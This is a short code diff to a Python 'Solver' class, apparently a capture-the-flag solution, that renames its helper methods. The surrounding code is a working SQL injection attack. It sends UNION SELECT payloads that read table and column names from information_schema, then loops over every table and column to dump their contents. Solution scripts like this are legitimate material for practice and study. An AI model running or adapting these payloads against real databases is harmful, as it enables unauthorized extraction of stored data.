@@ -24,15 +24,15 @@ class Solver:
 
         return last_column_values
 
-    def _get_table_names(self) -> list[str]:
+    def get_table_names(self) -> list[str]:
         return self.execute_payload("')) UNION SELECT 1, 2, 3, 4, 5, table_name, 7 FROM information_schema.tables; -- ")
 
-    def _get_column_names(self, table_name: str):
+    def get_column_names(self, table_name: str):
         return self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, column_name, 7 FROM information_schema.columns WHERE table_name = '{table_name}'; -- ")
 
     def main(self):
-        for table_name in self._get_table_names():
-            for column_name in self._get_column_names(table_name):
+        for table_name in self.get_table_names():
+            for column_name in self.get_column_names(table_name):
                 self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, {column_name}, 7 FROM {table_name}; -- ")
 
 if __name__ == "__main__":
